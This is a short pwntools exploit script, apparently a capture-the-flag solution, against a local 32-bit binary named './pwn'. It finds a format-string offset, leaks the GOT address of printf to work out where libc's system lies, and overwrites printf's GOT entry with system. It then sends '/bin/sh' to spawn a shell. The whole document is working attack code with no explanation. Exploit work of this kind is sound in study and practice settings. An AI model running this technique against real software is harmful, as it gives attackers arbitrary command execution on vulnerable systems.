from pwn import *
context.log_level = 'debug'
io = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
def exec_fmt(payload):
    io.sendline(payload)
    info = io.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset
printf_got = elf.got['printf']
payload = p32(printf_got) + '%{}$s'.format(offset)
io.send(payload)
printf = u32(io.recv()[4:8])
system = printf - libc.sym['printf'] + libc.sym['system']
log.info("system ===> %s" % hex(system))
payload = fmtstr_payload(offset,{printf_got:system})
io.send(payload)
io.send('/bin/sh')
io.recv()
